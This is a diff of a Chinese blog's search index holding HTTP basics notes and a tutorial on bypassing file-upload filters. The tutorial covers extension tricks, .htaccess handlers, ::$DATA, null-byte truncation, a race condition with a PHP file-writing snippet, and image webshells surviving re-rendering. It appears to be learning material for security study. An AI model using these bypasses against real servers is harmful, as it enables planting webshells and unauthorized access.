+<h2 id="13、二次渲染"><a href="#13、二次渲染" class="headerlink" title="13、二次渲染"></a>13、二次渲染</h2><p>意思是上传了的图片马中的16进制的内容被进行渲染篡改成乱码了，我们要对比上传前和上传后的图片马16进制的地方，哪个地方没有被二次渲染，就在那个地方进行添加一句话木马，这样就可以绕过二次渲染实现上传成功。</p>
 ]]></content>
   </entry>
   <entry>
@@ -1930,33 +1957,6 @@
 <h2 id="Web应用基础"><a href="#Web应用基础" class="headerlink" title="Web应用基础"></a>Web应用基础</h2><p>HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。</p>
 <p>HTTP1.1新增了五种请求方法：OPTIONS, PUT, DELETE, TRACE 和 CONNECT 方法。</p>
 <p>post方法中，请求头部是以一个空行为结束，即请求头部和body之间存在一个空白行。</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>文件上传绕过方式汇总</title>
-    <url>/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/</url>
-    <content><![CDATA[<h1 id="文件上传的绕过方式"><a href="#文件上传的绕过方式" class="headerlink" title="文件上传的绕过方式"></a>文件上传的绕过方式</h1><h2 id="1、前对验证绕过"><a href="#1、前对验证绕过" class="headerlink" title="1、前对验证绕过"></a><strong>1、前对验证绕过</strong></h2><p>F12打开调试器关闭js格式实现绕过</p>
-<h2 id="2、Content-Type方式绕过"><a href="#2、Content-Type方式绕过" class="headerlink" title="2、Content-Type方式绕过"></a><strong>2、Content-Type方式绕过</strong></h2><p>抓包修改Content-Type的数据为它允许的格式，如image&#x2F;jpeg</p>
-<h2 id="3、黑名单绕过（不允许上传php）"><a href="#3、黑名单绕过（不允许上传php）" class="headerlink" title="3、黑名单绕过（不允许上传php）"></a><strong>3、黑名单绕过（不允许上传php）</strong></h2><p>可以上传php5、phtml后缀名，需要到Apache的配置文件，http.conf配置文件里面进行打开相应的配置：</p>
-<p> AddType application&#x2F;x-httpd-php .php .phtml .php5 .pht</p>
-<p>还有就是AllOverride all也要保证是打开的，默认的是none</p>
-<h2 id="4、-htaccess文件绕过"><a href="#4、-htaccess文件绕过" class="headerlink" title="4、.htaccess文件绕过"></a><strong>4、.htaccess文件绕过</strong></h2><p>编辑一个新的.htaccess文件，里面编辑:</p>
-<p>&lt;FilesMatch “4.png”&gt;<br>SetHandler application&#x2F;x-httpd-php</p>
-<p>这串代码的意思是如果文件中有一个4.png（是4.txt改后缀名实现的，不是图片马）的文件，他就会被解析为.php，把这个文件上传上去，然后紧接着上传4.png，这样就会把4.png当成php进行解析。</p>
-<h2 id="5、后缀大小写"><a href="#5、后缀大小写" class="headerlink" title="5、后缀大小写"></a>5、后缀大小写</h2><h2 id="6、文件后缀（空）绕过"><a href="#6、文件后缀（空）绕过" class="headerlink" title="6、文件后缀（空）绕过"></a>6、文件后缀（空）绕过</h2><p>就在php.php后面加个空格就好了。</p>
-<h2 id="7、文件后缀（点绕过）"><a href="#7、文件后缀（点绕过）" class="headerlink" title="7、文件后缀（点绕过）"></a>7、文件后缀（点绕过）</h2><p>就在php.php后面加个点就好了，如php.php.</p>
-<h2 id="8、Windows文件流绕过（-DATA）"><a href="#8、Windows文件流绕过（-DATA）" class="headerlink" title="8、Windows文件流绕过（::$DATA）"></a>8、Windows文件流绕过（::$DATA）</h2><p><strong>在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名</strong>。例如:”test.php::$DATA”Windows会自动去掉末尾的::$DATA变成”test.php”。</p>
-<h2 id="9、文件名双写绕过"><a href="#9、文件名双写绕过" class="headerlink" title="9、文件名双写绕过"></a>9、文件名双写绕过</h2><p>pphphp格式进行绕过</p>
-<h2 id="10、后缀名绕过（点空格点）"><a href="#10、后缀名绕过（点空格点）" class="headerlink" title="10、后缀名绕过（点空格点）"></a>10、后缀名绕过（点空格点）</h2><h2 id="11、GET型00截断、POST型00截断"><a href="#11、GET型00截断、POST型00截断" class="headerlink" title="11、GET型00截断、POST型00截断"></a>11、GET型00截断、POST型00截断</h2><p>（<strong>PHP版本要在5.3.4</strong>以下且<strong>php的magic_quotes_gpc为OFF状态</strong>）</p>
-<h2 id="12、条件竞争"><a href="#12、条件竞争" class="headerlink" title="12、条件竞争"></a>12、条件竞争</h2><p>这里的逻辑是先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则重命名，否则删除。这样就存在一个安全问题，那就是我同时上传多个相同文件，在它删除之前访问就可以了。也就是条件竞争问题。可以借助burp的暴力破解模块。</p>
-<p>首先上传一个正常的符合条件的文件进行获取到上传路径，然后就在1.php里面编写内容：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php file_put_contents(&#x27;phpinfoshell.php&#x27;,&#x27;&lt;?php phpinfo();?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure></div>
-
-<p>意思是如果没有找到phpinfoshell.php文件，则创建该文件，内容是：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure></div>
-
-<p>让后通过bp抓包，进行null playd无限跑包，抓上传1.php包跑，跑了之后放包重新抓访问phpinfoshell.php包开始同时跑包，这样就可以通过条件竞争进行有概率的利用漏洞，在被删除之前访问1.php执行里面的file_put_contents函数创建phpinfoshell.php木马文件进行完美绕过。</p>
-<h2 id="13、二次渲染"><a href="#13、二次渲染" class="headerlink" title="13、二次渲染"></a>13、二次渲染</h2><p>意思是上传了的图片马中的16进制的内容被进行渲染篡改成乱码了，我们要对比上传前和上传后的图片马16进制的地方，哪个地方没有被二次渲染，就在那个地方进行添加一句话木马，这样就可以绕过二次渲染实现上传成功。</p>
 ]]></content>
   </entry>
 </search>
